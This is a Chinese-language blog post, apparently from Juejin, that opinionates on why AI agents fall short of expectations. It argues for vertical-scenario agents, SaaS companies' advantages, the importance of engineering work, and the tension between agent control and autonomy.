ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>最近经常会和 AI Agent 聊天，使用 AI 编程，并且也会和正在用 AI Agent 的朋友聊天，发现大家 AI Agent 的期待值和实际体验之间，存在着相当大的落差。</p>
<p>换句话说，大家觉得 Agent 不怎么聪明。</p>
<h2 data-id="heading-0">1. AI Agent 到底哪里不聪明</h2>
<p>可能是以下的方面：</p>
<ol>
<li>业务理解能力差。很多 AI Agent 看起来能对答如流，但一涉及到具体业务场景就开始答非所问。先不说原因，原因后面再细讲。</li>
<li>执行能力有限。在大家的预期中 AI Agent 应该能自主规划和执行任务，但实际上大部分所谓的 AI Agent 还停留在"问一句答一句"的阶段。我们想像中的一句话需求，如"帮我分析这份财报并生成投资建议"，大部分 AI Agent 是搞不定的，类似于 Manus 这种勉强可以的，但其结论是否能参考也是存疑的。</li>
<li>可控性差。我们一方面希望 Agent 有自主能力，能像人一样灵活处理问题；另一方面又希望它的行为可预测、可控制。这本身就是个悖论。结果就是，要么 Agent 太死板，只能按预设流程走；要么太「聪明」，经常做出一些让人意外的操作。</li>
<li>定制成本高。这本来不是聪明的问题，但这是聪明的代价，每个企业的业务都有自己的特殊性，要让 Agent 真正理解并适应这些特殊性，需要大量的定制化工作。但问题是，很多企业并没有这个技术能力或者预算来做深度定制。</li>
</ol>
<h2 data-id="heading-1">2. 为什么会出现这些问题</h2>
<p>我觉得主要是三方面的原因：</p>
<ol>
<li>过高的预期。过去一年，AI Agent 的概念被炒得太热了。各种厂商都在宣传 Agent 能够"完全替代人工"、"自主完成复杂任务"。但实际上，现在的技术水平离这个目标还有很大距离。有的老板，听了厂商的宣传后，真的以为买个 Agent 产品就能替代掉几个员工。结果上线后发现，不仅没法替代人，反而需要专人来"照顾"这个 Agent，教它怎么工作，纠正它的错误。</li>
<li>模糊的产品定位。现在市面上的 Agent 产品，很多都想做成"万能助手"。但越是想什么都做，越是什么都做不好。反而是那些专注于特定场景的 Agent，比如专门做客服的、专门做数据分析的，效果会好很多。</li>
<li>技术栈的割裂。做好一个 Agent，需要模型能力、工程能力、业务理解能力的深度结合。但往往懂模型的不懂业务，懂业务的不懂模型，懂工程的可能两个都不太懂。这种割裂导致做出来的产品总是差那么一些。</li>
</ol>
<h2 data-id="heading-2">3. 当前谁最有优势？</h2>
<p>答案是：SaaS 公司。</p>
<p>在 AI Agent 落地上，SaaS 公司有着天然的优势。</p>
<p>SaaS 公司最大的优势是接近客户和数据。他们天天跟客户打交道，知道客户的真实需求是什么，痛点在哪里，实际的业务流程是怎样的。更重要的是，他们手里有大量的业务数据和场景数据，这些数据对于训练和优化 Agent 来说是无价之宝。</p>
<p>举个例子，一家做 CRM 的 SaaS 公司，如果要做销售 Agent，它有几个天然优势：</p>
<p>第一，它知道销售的真实工作流程是什么样的。不是理论上的流程，而是实际操作中的流程，包括各种例外情况和潜规则。</p>
<p>第二，它有大量的销售数据。什么样的话术转化率高，什么时间打电话效果好，不同行业的客户有什么特点，这些数据都在它的系统里。</p>
<p>第三，它有现成的客户界面。不需要重新教育客户怎么使用 Agent，可以直接嵌入到现有的产品里。</p>
<p>第四，它有持续优化的能力。客户每天都在使用它的产品，产生新的数据，这些数据可以用来持续优化 Agent 的表现。</p>
<p>相比之下，纯做 AI 的公司，虽然模型能力很强，但在落地时往往会遇到各种水土不服的问题。</p>
<h2 data-id="heading-3">4. 垂直场景的突破</h2>
<p>在个人粗浅的认知中，Agent 的突破口在于垂直场景，而不是通用场景。在于需要 Konw-How 的场景。</p>
<p>为什么？因为垂直场景有几个优势：</p>
<p>第一，需求明确，专注。不需要 Agent 什么都会，只需要它把一件事做好就行。</p>
<p>第二，数据充足。垂直场景往往有大量的历史数据可以用来训练和优化。</p>
<p>第三，容错率高。因为场景固定，出现意外情况的概率较低，即使出现了也比较容易处理。</p>
<p>第四，ROI 清晰。在垂直场景下，Agent 的价值很容易量化。</p>
<p>比如法律文书撰写、行业分析、代码生成这些场景，都是合适的 Agent 应用场景。这些场景有明确的输入输出，有清晰的质量标准，有大量的历史数据，非常适合 Agent 来处理。</p>
<h2 data-id="heading-4">5. 可预测与可掌控的矛盾</h2>
<p>在 ToB 场景下，企业客户最怕的就是不确定性。如果一个 Agent 今天的回答和明天的回答不一样，或者在关键时刻做出了意料之外的决策，那对企业来说不可接受的。</p>
<p>但是，客户又希望 Agent 有自适应能力，能够灵活处理各种情况。</p>
<p>当前的解决方案基本上是两个极端：</p>
<ol>
<li>完全用 Workflow 来定义 Agent 的行为。每一步做什么都规定得清清楚楚，Agent 只是一个执行者。这样做的好处是完全可控，坏处是太死板，失去了 Agent 的灵活性。</li>
<li>完全放开，让 Agent 自己去学习和适应。这样做的好处是灵活，能处理各种意外情况，坏处是不可控，你永远不知道它下一步会做什么。</li>
</ol>
<p>比较理想的方案应该是两者的结合：在关键决策点上用 Workflow 来控制，在具体执行上给 Agent 一定的自主权。但这说起来容易，做起来很难。需要对业务有深入的理解，知道哪些地方需要控制，哪些地方可以放开。</p>
<h2 data-id="heading-5">6. 模型能力 vs 工程能力</h2>
<p>要解决这些矛盾和问题需要模型和工程两方面的提升，并且现阶段工程能力可能比模型能力更重要。</p>
<p>为什么？</p>
<p>因为现在的大模型能力其实已经不错了，GPT-5、Claude、DeepSeek 这些模型的理解和生成能力都很强。真正的瓶颈在于如何把这些能力转化成实际的业务价值。</p>
<p>这就需要大量的工程工作：</p>
<ul>
<li>如何设计合理的 Prompt，让模型理解业务需求</li>
<li>如何构建知识库，让模型能够获取必要的信息</li>
<li>如何设计工作流，让模型的输出能够被系统消费</li>
<li>如何做异常处理，保证系统的稳定性</li>
<li>如何做监控和优化，持续提升系统表现</li>
</ul>
<p>这些工作属于比较累和碎的活儿，不如训练模型那么「高大上」，但却是 Agent 能否落地的关键。</p>
<h2 data-id="heading-6">7. 安全问题</h2>
<p>AI Agent 的安全问题不仅仅是数据泄露，更大的问题在于，Agent 可能会做出一些不当的决策或者操作。</p>
<p>比如，一个有权限访问企业数据库的 Agent，如果被恶意引导，可能会删除重要数据或者泄露敏感信息。一个负责采购的 Agent，如果判断失误，可能会下错订单，造成巨大损失。如此种种……</p>
<p>现在的解决方案主要是加各种限制和审核机制，但这又回到了前面的矛盾：限制越多，Agent 就越不「智能」。</p>
<h2 data-id="heading-7">8. 可能的未来</h2>
<p>基于目前的情况，我觉得接下来的一段时间 Agent 的发展会有几个趋势：</p>
<p>第一，从通用到垂直。越来越多的 Agent 会专注于特定的场景和行业。</p>
<p>第二，从替代到增强。Agent 的定位会从「替代人工」转变为「增强人工」。</p>
<p>第三，从单点到系统。不再是一个个孤立的 Agent，而是多个 Agent 协同工作的系统。</p>
<p>第四，从产品到服务。Agent 不再是一个买来就用的产品，而是需要持续优化的服务。</p>
<p>这些趋势意味着什么？</p>
<p>意味着 Agent 市场会越来越理性，泡沫会逐渐消失，真正有价值的应用会脱颖而出。</p>
<h2 data-id="heading-8">9. 最后</h2>
<p>回到标题：AI Agent不够聪明</p>
<p>确实不够聪明，至少没有我们期望的那么聪明。</p>
<p>但这不意味着 Agent 没有价值。就像早期的计算机，虽然功能有限，但在特定场景下已经能创造巨大价值。关键是找到合适的场景，用合适的方式，解决真实的问题。</p>
<p>AI Agent 的发展还处于早期阶段，现在下结论还为时过早。但有一点是确定的：那些能够深入理解客户需求，扎实做好工程实施，持续优化产品体验的公司，最终会在这个市场上站稳脚跟。</p>
<p>至于 AI Agent 什么时候能真正「聪明」起来？我觉得还需要时间。可能是一年，可能是三年，也可能是五年。但在这个过程中，我们需要做的不是等待，而是不断探索、试错、优化，一步步接近那个目标。</p>
<p>毕竟，罗马不是一下子建成的，AI Agent 也不是。</p>
<p>以上。</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item>  </channel></rss>